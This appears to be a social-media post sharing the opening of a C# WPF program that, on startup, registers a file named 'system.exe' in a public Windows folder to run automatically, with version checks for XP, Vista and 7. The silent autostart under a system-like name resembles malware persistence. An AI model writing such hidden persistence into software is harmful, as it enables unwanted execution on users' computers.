#programowanie
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;

namespace WpfApplication_OKSANA
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public static string needPatch = "C:\\Users\\Public\\";


        public MainWindow()
        {
            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista" )
            {
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }
            else
                if (OSVersionInfo.Name == "Windows XP")
            {
                needPatch = "C:\\Documents and Settings\\All Users\\";
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                                                                         //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }

            InitializeComponent();
        }
        
